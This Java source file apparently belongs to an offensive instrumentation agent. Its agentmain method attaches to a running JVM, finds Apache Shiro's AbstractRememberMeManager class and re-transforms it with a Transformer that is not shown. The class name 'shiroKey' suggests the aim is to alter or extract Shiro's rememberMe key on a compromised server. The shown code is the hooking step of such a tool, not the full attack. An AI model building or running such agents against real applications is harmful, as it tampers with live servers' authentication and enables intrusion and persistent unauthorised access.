package net.shiroha.agent;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.util.Base64;

public class shiroKey {
    public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException {
        Class[] classes = inst.getAllLoadedClasses();
        final String shiroClassName = "org.apache.shiro.mgt.AbstractRememberMeManager";
        try {
            for (Class aClass : classes) {
                if (aClass.getName().equals(shiroClassName)) {
                    inst.addTransformer(new Transformer(), true);
                    inst.retransformClasses(aClass);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
        }
    }
}
